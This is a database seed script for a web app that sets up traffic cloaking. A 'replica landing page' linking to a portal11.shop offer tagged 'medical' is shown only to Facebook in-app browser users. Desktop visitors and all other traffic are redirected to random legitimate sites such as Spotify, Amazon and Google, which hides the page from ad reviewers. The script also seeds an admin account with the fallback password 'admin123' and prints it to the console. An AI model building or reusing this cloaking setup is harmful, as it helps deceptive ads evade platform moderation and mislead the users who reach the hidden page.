import { PrismaClient } from "@prisma/client";
import bcrypt from "bcryptjs";
import { DEFAULT_LANDING_IMAGES, DEFAULT_OG } from "../src/lib/site-config";

const prisma = new PrismaClient();
const appUrl = process.env.NEXT_PUBLIC_APP_URL ?? "http://localhost:3000";
const seedRules = process.env.SEED_RULES !== "false";

async function main() {
  const email = process.env.ADMIN_EMAIL ?? "admin@example.com";
  const password = process.env.ADMIN_PASSWORD ?? "admin123";

  await prisma.adminUser.upsert({
    where: { email },
    update: {},
    create: {
      email,
      name: "Admin",
      passwordHash: await bcrypt.hash(password, 12),
    },
  });

  await prisma.siteConfig.upsert({
    where: { id: "default" },
    update: {},
    create: {
      id: "default",
      landingTitle: "OYAAA OYAAA PLAY",
      landingCtaUrl:
        "https://portal11.shop/fANGh?utm_source=facebook&utm_medium=medical&utm_campaign=premium_hospital_guides",
      landingImages: DEFAULT_LANDING_IMAGES,
      ogTitle: DEFAULT_OG.title,
      ogDescription: DEFAULT_OG.description,
      ogImage: DEFAULT_OG.image,
      ogUrl: DEFAULT_OG.url,
      desktopRedirectUrl: "https://www.facebook.com",
      desktopBreakpoint: 1024,
      delayedRedirectMs: 4500,
      enableDesktopRedirect: true,
      enableDelayedRedirect: true,
    },
  });

  const destinations = await Promise.all([
    prisma.destination.upsert({
      where: { slug: "primary" },
      update: { url: `${appUrl}/landing/primary` },
      create: {
        name: "Primary Landing Page",
        slug: "primary",
        url: `${appUrl}/landing/primary`,
        type: "INTERNAL",
        description: "Replica landing page for Facebook in-app traffic",
      },
    }),
    prisma.destination.upsert({
      where: { id: "seed-spotify" },
      update: {},
      create: {
        id: "seed-spotify",
        name: "Spotify",
        url: "https://open.spotify.com",
        type: "EXTERNAL",
      },
    }),
    prisma.destination.upsert({
      where: { id: "seed-amazon" },
      update: {},
      create: {
        id: "seed-amazon",
        name: "Amazon",
        url: "https://www.amazon.com",
        type: "EXTERNAL",
      },
    }),
    prisma.destination.upsert({
      where: { id: "seed-google" },
      update: {},
      create: {
        id: "seed-google",
        name: "Google",
        url: "https://www.google.com",
        type: "EXTERNAL",
      },
    }),
    prisma.destination.upsert({
      where: { id: "seed-facebook" },
      update: {},
      create: {
        id: "seed-facebook",
        name: "Facebook",
        url: "https://www.facebook.com",
        type: "EXTERNAL",
      },
    }),
  ]);

  const byName = Object.fromEntries(destinations.map((d) => [d.name, d]));

  const randomPool = await prisma.destinationPool.upsert({
    where: { name: "Random Redirect Pool" },
    update: {},
    create: {
      name: "Random Redirect Pool",
      description: "Weighted random external destinations for non-matched traffic",
    },
  });

  const poolMembers = [
    { destinationId: byName.Spotify.id, weight: 40 },
    { destinationId: byName.Amazon.id, weight: 30 },
    { destinationId: byName.Google.id, weight: 20 },
    { destinationId: byName.Facebook.id, weight: 10 },
  ];

  for (const member of poolMembers) {
    await prisma.poolMember.upsert({
      where: {
        poolId_destinationId: {
          poolId: randomPool.id,
          destinationId: member.destinationId,
        },
      },
      update: { weight: member.weight },
      create: {
        poolId: randomPool.id,
        destinationId: member.destinationId,
        weight: member.weight,
      },
    });
  }

  if (seedRules) {
    const existingRules = await prisma.routingRule.count();
    if (existingRules === 0) {
      await prisma.routingRule.create({
        data: {
          name: "Facebook In-App → Primary Landing",
          description: "Show replica landing page to Facebook in-app browser users",
          priority: 10,
          action: "SHOW",
          destinationId: byName["Primary Landing Page"].id,
          conditions: {
            create: [{ field: "IS_FACEBOOK_INAPP", operator: "EQUALS", value: "true" }],
          },
        },
      });

      await prisma.routingRule.create({
        data: {
          name: "All Other Traffic → Random External Pool",
          description: "Weighted random redirect for browser and non in-app traffic",
          priority: 100,
          action: "REDIRECT",
          poolId: randomPool.id,
          conditions: {
            create: [{ field: "LANGUAGE", operator: "CONTAINS", value: "" }],
          },
        },
      });
    }
  }

  console.log("Seed completed");
  console.log(`Admin login: ${email} / ${password}`);
  console.log(`App URL: ${appUrl}`);
}

main()
  .catch((error) => {
    console.error(error);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
